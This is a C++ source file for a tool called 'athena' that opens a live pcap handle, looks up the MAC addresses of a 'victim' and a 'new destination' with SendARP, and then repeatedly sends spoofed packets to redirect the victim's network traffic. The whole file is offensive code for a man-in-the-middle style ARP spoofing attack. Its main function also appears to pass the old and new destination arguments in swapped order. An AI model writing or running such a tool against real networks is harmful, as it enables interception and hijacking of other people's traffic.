#include "athena.h"

void redirect(string iface, uint8_t* target, uint8_t* ndest, uint8_t* odest, IPAddr t2, IPAddr n2) {
    char errbuf[PCAP_ERRBUF_SIZE];

	pcap_t* handle = pcap_open_live(iface.c_str(), 65536, 0, 1, errbuf);
	if (handle == NULL) {
        cout << "Failed to open pcap handle." << endl;
		return;
	}
   
    ULONG macLen = 6;

    ULONG tmac[6];
    if (SendARP(t2, INADDR_ANY, &tmac, &macLen) != NO_ERROR) {
        cout << "The target is offline." << endl;
        return;
    }

    ULONG dmac[6];
    if (SendARP(n2, INADDR_ANY, &dmac, &macLen) != NO_ERROR) {
        cout << "The new IP is offline." << endl;
        return;
    }
    
    while (1) {
        if (!spoof(handle, (uint8_t*)(BYTE*)tmac, target, (uint8_t*)(BYTE*)dmac, ndest)) {
            cout << "Failed to spoof packets" << endl;
            return;
        }
        Sleep(1);
    }
	return;
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        cout << "Usage:" << endl << "athena [victim] [old destination] [new destination]" << endl;
        return 1;
    }

    uint8_t target[4];
    uint8_t odest[4];
    uint8_t ndest[4];

    strToIp(string(argv[1]).c_str(), target);
    strToIp(string(argv[3]).c_str(), ndest);
    strToIp(string(argv[2]).c_str(), odest);

    cout << "Which interface number would you like to use?" << endl;
    int ii = 1;
    vector<string> ifaces = getDevices();
    for (string dev : ifaces) {
        cout << "Number " << to_string(ii) << ": " << dev << endl;
        ii++;
    }

    string ifacen;
    cin >> ifacen;

    cout << endl << "Press CTRL+C to stop." << endl;
    
    redirect(ifaces[stoi(ifacen) - 1], target, odest, ndest, inet_addr(string(argv[1]).c_str()), inet_addr(string(argv[3]).c_str()));
    
    return 1;
}
